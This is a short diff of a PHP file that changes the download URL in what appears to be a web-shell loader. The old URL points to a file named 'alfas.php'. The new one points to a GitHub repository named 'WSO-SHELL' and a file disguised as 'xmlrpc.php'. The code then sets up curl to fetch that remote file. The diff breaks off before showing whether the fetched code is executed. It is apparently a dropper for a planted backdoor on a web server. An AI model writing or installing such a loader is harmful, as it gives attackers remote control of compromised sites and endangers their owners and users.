@@ -1,5 +1,5 @@
 <?php
-$url = "https://github.com/kembarbaru120000/213/raw/refs/heads/main/alfas.php";
+$url = "https://raw.githubusercontent.com/rendihidayat683/WSO-SHELL/refs/heads/main/xmlrpc.php";
 
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, $url);
